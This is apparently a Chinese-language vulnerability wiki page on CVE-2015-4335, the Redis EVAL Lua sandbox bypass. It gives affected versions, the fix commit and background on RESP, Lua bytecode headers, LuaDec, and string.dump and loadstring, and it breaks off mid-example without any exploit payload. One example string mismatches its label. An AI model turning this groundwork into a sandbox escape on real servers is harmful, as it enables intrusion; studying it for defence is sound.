<p>Redis:3.0.0 up to 3.0.1</p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/redis/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411">https://github.com/redis/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411</a></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP（Redis的序列化协议）</p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/23.png"></p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/10.png"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><p>​        Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 </p>
<p>​        例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET 1234 TEST</span><br><span class="line">GETSET 1234 TEST2</span><br><span class="line">GET 1234</span><br></pre></td></tr></table></figure>

<p>​        有关Redis命令的完整列表，请参考 <a target="_blank" rel="external nofollow noopener noreferrer" href="http://redis.io/commands">http://redis.io/commands</a></p>
<p>​        Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 <a target="_blank" rel="external nofollow noopener noreferrer" href="http://redis.io/topics/protocol%E8%8E%B7%E5%BE%97%E8%AF%A5%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E3%80%82">http://redis.io/topics/protocol获得该协议详细说明。</a> RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识：</p>
<ul>
<li><p>简单字符串以“ +”字符开头</p>
</li>
<li><p>错误以“-”字符开头</p>
</li>
<li><p>整数以“：”字符开头</p>
</li>
<li><p>批量字符串以“ $”字符开头</p>
</li>
<li><p>数组以“ *”字符开头</p>
<p>​    批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$7 CRLF</span><br><span class="line">TELUS</span><br></pre></td></tr></table></figure>

<p>​        其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 </p>
<p>​        RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2 CRLF</span><br><span class="line">$7 CRLF</span><br><span class="line">Sangfor CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure>

<p>​        所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3 CRLF</span><br><span class="line">$3 CRLF</span><br><span class="line">SET CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">1234 CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure>

<p>​        <strong>Lua</strong>是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/">https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/</a></p>
<p>​        Redis客户端可通过EVAL命令使用此解释器。 Lua脚本允许用户管理和操纵Redis服务器上的记录。 例如，以下Lua脚本可用于执行上述SET命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EVAL &quot;redis.call(&#x27;set&#x27;,&#x27;1234&#x27;,&#x27;TEST&#x27;)&quot; 0</span><br></pre></td></tr></table></figure>

<p>​        执行此Lua脚本的另一种方法是使用SCRIPT LOAD和EVALSHA命令。 SCRIPT LOAD命令在服务器上缓存Lua脚本，并返回SHA1摘要。 EVALSHA命令可以与此SHA1摘要一起用作执行脚本的参数。 下面是一个示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SCRIPT LOAD &quot;redis.call(&#x27;set&#x27;,&#x27;1234&#x27;,&#x27;TEST&#x27;)&quot; 0</span><br><span class="line">EVALSHA &lt;SHA1 digest from above&gt;</span><br></pre></td></tr></table></figure>

<p>​        Lua还提供了分别使用struct.pack和struct.unpack方法将Lua变量与C类型的Stucts相互转换的方法。 例如，以下内容可用于包装整数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct.pack (&quot;&lt;I2&quot;, 10)</span><br></pre></td></tr></table></figure>

<ul>
<li>“I”指定整数是无符号的（“ i”用于有符号整数）</li>
<li>“&lt;”指定应以小端格式表示（“&gt;”用于大端格式）</li>
<li>“2”指定整数为2个字节长</li>
<li>“10”指定要打包的整数的值</li>
</ul>
<p><strong>ZADD key score member [[score member] [score member] …]</strong></p>
<blockquote>
<p>可用版本： &gt;= 1.2.0</p>
<p>时间复杂度: O(M*log(N))， <code>N</code> 是有序集的基数， <code>M</code> 为成功添加的新成员的数量。</p>
</blockquote>
<p>将一个或多个 <code>member</code> 元素及其 <code>score</code> 值加入到有序集 <code>key</code> 当中。</p>
<p>如果某个 <code>member</code> 已经是有序集的成员，那么更新这个 <code>member</code> 的 <code>score</code> 值，并通过重新插入这个 <code>member</code> 元素，来保证该 <code>member</code> 在正确的位置上。</p>
<p><code>score</code> 值可以是整数值或双精度浮点数。</p>
<p>如果 <code>key</code> 不存在，则创建一个空的有序集并执行 <a target="_blank" rel="external nofollow noopener noreferrer" href="http://redisdoc.com/sorted_set/zadd.html?highlight=zadd#zadd"><strong>ZADD</strong></a> 操作。</p>
<p>当 <code>key</code> 存在但不是有序集类型时，返回一个错误。</p>
<p>对有序集的更多介绍请参见 <a target="_blank" rel="external nofollow noopener noreferrer" href="http://redis.io/topics/data-types#sorted-sets">sorted set</a> 。</p>
<p>Note：在 Redis 2.4 版本以前， <a target="_blank" rel="external nofollow noopener noreferrer" href="http://redisdoc.com/sorted_set/zadd.html?highlight=zadd#zadd"><strong>ZADD</strong></a> 每次只能添加一个元素。</p>
<p><strong>返回值</strong></p>
<p>被成功添加的新成员的数量，不包括那些被更新的、已经存在的成员。</p>
<p><strong>代码示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># 添加单个元素</span><br><span class="line"></span><br><span class="line">redis&gt; ZADD page_rank 10 google.com</span><br><span class="line">(integer) 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加多个元素</span><br><span class="line"></span><br><span class="line">redis&gt; ZADD page_rank 9 baidu.com 8 bing.com</span><br><span class="line">(integer) 2</span><br><span class="line"></span><br><span class="line">redis&gt; ZRANGE page_rank 0 -1 WITHSCORES</span><br><span class="line">1) &quot;bing.com&quot;</span><br><span class="line">2) &quot;8&quot;</span><br><span class="line">3) &quot;baidu.com&quot;</span><br><span class="line">4) &quot;9&quot;</span><br><span class="line">5) &quot;google.com&quot;</span><br><span class="line">6) &quot;10&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加已存在元素，且 score 值不变</span><br><span class="line"></span><br><span class="line">redis&gt; ZADD page_rank 10 google.com</span><br><span class="line">(integer) 0</span><br><span class="line"></span><br><span class="line">redis&gt; ZRANGE page_rank 0 -1 WITHSCORES  # 没有改变</span><br><span class="line">1) &quot;bing.com&quot;</span><br><span class="line">2) &quot;8&quot;</span><br><span class="line">3) &quot;baidu.com&quot;</span><br><span class="line">4) &quot;9&quot;</span><br><span class="line">5) &quot;google.com&quot;</span><br><span class="line">6) &quot;10&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加已存在元素，但是改变 score 值</span><br><span class="line"></span><br><span class="line">redis&gt; ZADD page_rank 6 bing.com</span><br><span class="line">(integer) 0</span><br><span class="line"></span><br><span class="line">redis&gt; ZRANGE page_rank 0 -1 WITHSCORES  # bing.com 元素的 score 值被改变</span><br><span class="line">1) &quot;bing.com&quot;</span><br><span class="line">2) &quot;6&quot;</span><br><span class="line">3) &quot;baidu.com&quot;</span><br><span class="line">4) &quot;9&quot;</span><br><span class="line">5) &quot;google.com&quot;</span><br><span class="line">6) &quot;10&quot;</span><br></pre></td></tr></table></figure>

<p>LuaDec是lua 5.1的Lua反编译器，并且是lua 5.2和5.3的实验版。它基于Hisham Muhammad的luadec，其针对Zsolt Sz的lua 5.0.x和LuaDec51。Sztupak。</p>
<p>LuaDec是免费软件，并且使用与原始LuaDec相同的许可证。</p>
<p><strong>编译中</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/viruscamp/luadec</span><br><span class="line">cd luadec</span><br><span class="line">git submodule update --init lua-5.1</span><br><span class="line">cd lua-5.1</span><br><span class="line">make linux</span><br><span class="line">cd ../luadec</span><br><span class="line">make LUAVER=5.1</span><br></pre></td></tr></table></figure>

<p>如果要为lua 5.2或5.3构建它，只需将上面的5.1替换为5.2或5.3。</p>
<p>还有vc2008的项目文件，已针对vc2008和vc2013进行了测试。<br>编译之前，请确保lua-5.1，lua-5.2或lua-5.3中的源正确。</p>
<p><strong>用法</strong></p>
<ul>
<li>反编译lua二进制文件：<br>luadec abc.luac</li>
<li>反编译lua源文件以进行测试和比较：<br>luadec abc.lua</li>
<li>反汇编lua源代码或二进制<br>luadec -dis abc.lua</li>
<li>-pn打印嵌套函数结构，-fn可以使用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">luadec -pn test.lua</span><br><span class="line">0</span><br><span class="line">  0_0</span><br><span class="line">    0_0_0</span><br><span class="line">  0_1</span><br></pre></td></tr></table></figure>

<ul>
<li>-f仅反编译特定的嵌套函数<br>luadec -f 0_1 test.lua</li>
<li>-ns不处理子函数<br>luadec -ns -f 0_1 test.lua</li>
<li>-fc对每个函数<br>luadec -fc test.lua进行逐条指令比较<br>：输出<br>-函数检查通过0-<br>函数检查失败0_0：无法编译<br>-函数检查失败0_1：不同的代码大小；sizecode组织：66；反编译：67；相同：47；</li>
</ul>
<p>还有更多选项，通常用于调试目的，或用于内置本地猜测器猜测错误的情况。使用-h获取可用参数的完整列表</p>
<p><strong>lua的字节码</strong></p>
<p>​    lua源码在执行前，会被编译为字节码，字节码能加快程序的加载，保存lua源码被意外的修复。lua的字节码只在具有相同的字长和字节顺序的机器上能够移植。<br>​        luac编译器能将lua源码编译为字节码二进制文件，其命令如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">luac a.lua</span><br></pre></td></tr></table></figure>

<p>​        luac默认的输出文件为luac.out,可以通过 -o 选项来指定输出文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">luac -o a.out a.lua</span><br></pre></td></tr></table></figure>

<p>​        当Lua发布新版时，luac生成的二进制文件的内部格式可能改变。</p>
<p><strong>字节码文件头</strong></p>
<p><strong>lua5.1</strong>字节码文件头的长度为12字节，Win7 64位，VS下编译为Win32应用如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1b4c 7561 5100 0104 0404 0800</span><br></pre></td></tr></table></figure>

<p>其中第1-4字节为：”\033Lua”；第5字节标识lua的版本号，lua5.1为 0x51；第6字节为官方中保留，lua5.1中为 0x0；<br>第7字节标识字节序，little-endian为0x01，big-endian为0x00；<br>第8字节为sizeof(int)；第9字节为sizeof(size_t)；第10字节为sizeof(Instruction)，Instruction为lua内的指令类型，在32位以上的机器上为unsigned int；第11字节为sizeof(lua_Number)，lua_Number即为double;<br>第12字节是判断lua_Number类型起否有效，一般为 0x00;</p>
<p><strong>lua5.2</strong>字节码文件头的长度为18字节，在我的环境里(Win7 64位，VS下编译为Win32应用)如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1b4c 7561 5200 0104 0404 0800 1993 0d0a 1a0a</span><br></pre></td></tr></table></figure>

<p>其中第1-12字节与lua5.1意义相同，第5字节在lua5.2中为 0x52；<br>第13-18字节是为了捕获字节码的转换错误而设置的，其值为 “\x19\x93\r\n\x1a\n”；</p>
<p>PS:lua在判断字节序时使用的方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 void luaU_header (char* h)</span><br><span class="line">2 &#123;</span><br><span class="line">3     int x=1;</span><br><span class="line">4     //...</span><br><span class="line">5     *h++=(char)*(char*)&amp;x;             /* endianness */</span><br><span class="line">6     //...</span><br><span class="line">7 &#125;</span><br></pre></td></tr></table></figure>

<p>在little-endian时，*(char*)&amp;x值为0x01；big-endian时，*(char*)&amp;x值为 0x00；</p>
<p><strong>字节码文件正文</strong></p>
<p>​        <strong>lua5.1</strong> 在文件头之后，就是正头，它由一个个函数组成，其中第一个函数包含由文件内全部内容，引全局函数名为”@”+文件件名(包含”.lua”后缀)，在此文件中定义的函数都会在全局函数中以常量字符串保存；<br>每个函数的内容缓存如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">源文件名的长度(包括&#x27;\0&#x27;)，为sizeof(size_t)个字节长，只有全局函数有源文件名，其它内部函数其长度填0；</span><br><span class="line">源文件名(包括\0)，长度为长度*sizeof(char)个字节；</span><br><span class="line">函数行数，全局函数的填0，长度为sizeof(int)个字节；</span><br><span class="line">函数的最后一行，全局函数的填0，长度为sizeof(int)个字节；</span><br><span class="line">函数的upvalues数目，长度为sizeof(char)个字节；</span><br><span class="line">函数的参数个数，全局函数的填0，长度为sizeof(char)个字节；</span><br><span class="line">函数的vararg个数，只有全局函数有；</span><br><span class="line">函数最大的栈数目，长度为sizeof(char)个字节；</span><br><span class="line">函数的指令数目，长度为sizeof(int)个字节；</span><br><span class="line">函数的指令，长度为指令数目*sizeof(Instruction)个字节；</span><br><span class="line">函数中常量的数目，长度为sizeof(int)个字节；</span><br><span class="line">函数中的常量，长度为常量数目*(常量类似标识长度+指定常量点用的长度)，常量类似标识长度为sizeof(char)个字节；</span><br><span class="line">函数中的内部函数数目，长度为sizeof(int)个字节；</span><br><span class="line">内部函数的定，格式同外部函数；</span><br><span class="line">函数的调试信息；</span><br></pre></td></tr></table></figure>

<p>​        文件binc.lua的内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 local i = 6;</span><br><span class="line">2 return 1;</span><br></pre></td></tr></table></figure>

<p>​        其正文的字节码(lua5.1编译，不包括调试信息,前面的空白外为文件头)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">                              0a00 0000</span><br><span class="line">4062 696e 632e 6c75 6100 0000 0000 0000</span><br><span class="line">0000 0000 0202 0400 0000 0100 0000 4140</span><br><span class="line">0000 5e00 0001 1e00 8000 0200 0000 0300</span><br><span class="line">0000 0000 0018 4003 0000 0000 0000 f03f</span><br><span class="line">0000 0000</span><br></pre></td></tr></table></figure>

<p>​        <strong>lua5.2</strong> 的正文部分与lua5.1存在差别。其没有源文件名的说明，别对于upvalue的处理也不一样，lua5.2中upvalue在常量后面定义，由upvalue的数目后加上分upvalue的定义组成。</p>
<p><strong>string.gsub()</strong></p>
<ul>
<li>原型：string.gsub (s, pattern, repl [,m])</li>
<li>解释：这个函数会返回一个替换后的副本，原串中所有的符合参数<code>pattern</code>的子串都将被参数<code>repl</code>所指定的字符串所替换，如果指定了参数<code>m</code>，那么只替换查找过程的前<code>m</code>个匹配的子串，参数<code>repl</code>可以是一个字符串、表、或者是函数，并且函数可以将匹配的次数作为函数的第二个参数返回，接下来看看参数<code>repl</code>的含义：</li>
<li>如果参数<code>repl</code>是一个常规字符串，成功匹配的子串会被<code>repl</code>直接替换，如果参数<code>repl</code>中包含转移字符<code>%</code>，那么可以采用<code>%n</code>的形式替换，当<code>%n</code>中的<code>n</code>取值1-9时，表示一次匹配中的第n个子串，当其中的<code>n</code>为0时，表示这次匹配的整个子串，<code>%%</code>表示一个单独的<code>%</code>。</li>
<li>如果参数<code>repl</code>是一个表，那么每次匹配中的第一个子串将会作为整个表的键，取table[匹配子串]来替换所匹配出来的子串，当匹配不成功时，函数会使用整个字符串来作为table的键值。</li>
<li>如果参数<code>repl</code>是一个函数，那么每一次匹配的子串都将作为整个函数的参数，取function(匹配子串)来替换所匹配出来的子串，当匹配不成功时，函数会使用整个字符串来作为函数的参数。如果函数的返回值是一个数字或者是字符串，那么会直接拿来替换，如果它返回<code>false</code>或者<code>nil</code>，替换动作将不会发生，如果返回其他的值将会报错。</li>
</ul>
<hr>
<p><strong>Usage</strong></p>
<ul>
<li>首先新建一个文件将文件命名为gsubtest.lua然后编写如下代码：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">-- 常规替换</span><br><span class="line">x = string.gsub(<span class="string">&quot;hello world&quot;</span>, <span class="string">&quot;(%w+)&quot;</span>, <span class="string">&quot;lua&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 都用匹配的第一个串*2来替换</span><br><span class="line">x = string.gsub(<span class="string">&quot;hello world&quot;</span>, <span class="string">&quot;(%w+)&quot;</span>, <span class="string">&quot;%1 %1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 用匹配出的完成串*2来替换第一次匹配的结果</span><br><span class="line">x = string.gsub(<span class="string">&quot;hello world&quot;</span>, <span class="string">&quot;%w+&quot;</span>, <span class="string">&quot;%0 %0&quot;</span>, 1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 使用一个完整匹配和一个匹配的第二个串来替换</span><br><span class="line">x = string.gsub(<span class="string">&quot;hello world from c to lua&quot;</span>, <span class="string">&quot;(%w+) (%a+)&quot;</span>, <span class="string">&quot;%0 %2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 调用系统函数来替换</span><br><span class="line">x = string.gsub(<span class="string">&quot;os = <span class="variable">$OS</span>, pathext = <span class="variable">$PATHEXT</span>&quot;</span>, <span class="string">&quot;%<span class="subst">$(%w+)</span>&quot;</span>, os.getenv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 调用自定义函数</span><br><span class="line">x = string.gsub(<span class="string">&quot;4 + 5 = <span class="variable">$return</span> 4+5$&quot;</span>, <span class="string">&quot;%<span class="subst">$(.-)</span>%$&quot;</span>, <span class="keyword">function</span> (s)</span><br><span class="line">      <span class="built_in">return</span> loadstring(s)()</span><br><span class="line">    end)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 调用表来替换</span><br><span class="line"><span class="built_in">local</span> t = &#123;name=<span class="string">&quot;lua&quot;</span>, version=<span class="string">&quot;5.1&quot;</span>&#125;</span><br><span class="line">x = string.gsub(<span class="string">&quot;<span class="variable">$name</span>-<span class="variable">$version</span>.tar.gz&quot;</span>, <span class="string">&quot;%<span class="subst">$(%w+)</span>&quot;</span>, t)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br></pre></td></tr></table></figure>

<ul>
<li>有一点需要注意的是，使用函数作为替换结果时，函数只能返回数字、字符串、<code>false</code>和<code>nil</code>。</li>
</ul>
<p><strong>string.dump()</strong></p>
<ul>
<li>原型：string.dump (function)</li>
<li>解释：返回一个包含所给函数二进制描述的字符串，以至于在此之后可以使用函数<code>loadstring()</code>利用所得到的字符串来返回一个函数拷贝，需要注意的是函数只能是Lua函数并且没有upvalues(外部局部变量)。</li>
</ul>
<hr>
<p><strong>Usage</strong></p>
<ul>
<li>首先新建一个文件将文件命名为dumptest.lua如下代码:</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">--自定义一个函数</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">custom_func</span>(<span class="params">num1, num2</span>)</span></span><br><span class="line"><span class="function">    <span class="title">local</span> <span class="title">ret</span> = <span class="title">num1</span> + <span class="title">num2</span></span>;</span><br><span class="line">    print(<span class="string">&quot;\nnum1 = &quot;</span>..num1)</span><br><span class="line">    print(<span class="string">&quot;num2 = &quot;</span>..num2)</span><br><span class="line">    print(<span class="string">&quot;num1 + num2 = &quot;</span>..ret)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">-- 将函数序列化</span><br><span class="line">local func_content = string.dump(custom_func)</span><br><span class="line">print(<span class="string">&quot;\nfunc_content = &quot;</span>..func_content)</span><br><span class="line"></span><br><span class="line">-- 将转化后的字符串写入文件</span><br><span class="line">local outfile = io.open(<span class="string">&quot;dumptest.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">local outnum = outfile:write(func_content)</span><br><span class="line"><span class="attr">outfile</span>:close()</span><br><span class="line"></span><br><span class="line">-- 从文件总读取内容</span><br><span class="line">local infile = io.open(<span class="string">&quot;dumptest.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">local incontent = infile:read(<span class="string">&quot;*a&quot;</span>)</span><br><span class="line"><span class="attr">infile</span>:close()</span><br><span class="line">print(<span class="string">&quot;\ninput content is &quot;</span>..incontent)</span><br><span class="line"></span><br><span class="line">-- 加载函数</span><br><span class="line">local myfunc = loadstring(incontent)</span><br><span class="line"></span><br><span class="line">-- 执行函数</span><br><span class="line">myfunc(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">myfunc(<span class="number">3</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">-- 输出这个幸福的七月七</span><br><span class="line">myfunc(<span class="string">&quot;7&quot;</span> ,<span class="string">&quot;.7&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;\nthis is a happy day!&quot;</span>)</span><br><span class="line">print(os.date())</span><br></pre></td></tr></table></figure>

<ul>
<li>看了这个函数是不是有种非常神奇的感觉，原来传说中的序列化可以离我们这么近。</li>
<li>在调用了函数<code>string.dump()</code>之后函数<code>custom_func()</code>被转化成字符串保存在文件中，可以在使用时再取出来。</li>
<li>这个函数一般写逻辑代码应该用不到，更多的是做框架的时候用的功能，进过序列化的函数可以通过网络传送、转化、再使用。</li>
</ul>
<p><strong>loadstring()</strong></p>
<ul>
<li>loadstring(string [,chunkname])</li>
<li>解释：函数会从所给的字符串中来加载程序块并运行，常使用这种构造式来调用<code>assert(loadstring(s))()</code>，如果省略参数<code>chunkname</code>，那么它默认为所给的字符串。</li>
</ul>
<hr>
<p><strong>usage</strong></p>
<ul>
<li>首先我们新建一个文件将文件命名为loadstring.lua然后编写代码如下：</li>
</ul>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">--</span> 简单测试</span><br><span class="line">local ret <span class="operator">=</span> loadstring(<span class="string">&quot;print(<span class="subst">\&quot;</span>first test loadstring function.<span class="subst">\&quot;</span>)&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;<span class="subst">\n</span>the result ret is&quot;</span>, ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> 运行返回值</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;<span class="subst">\n</span>the result of running ret() is:&quot;</span>)</span><br><span class="line">ret();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> 使用常用的方式</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;<span 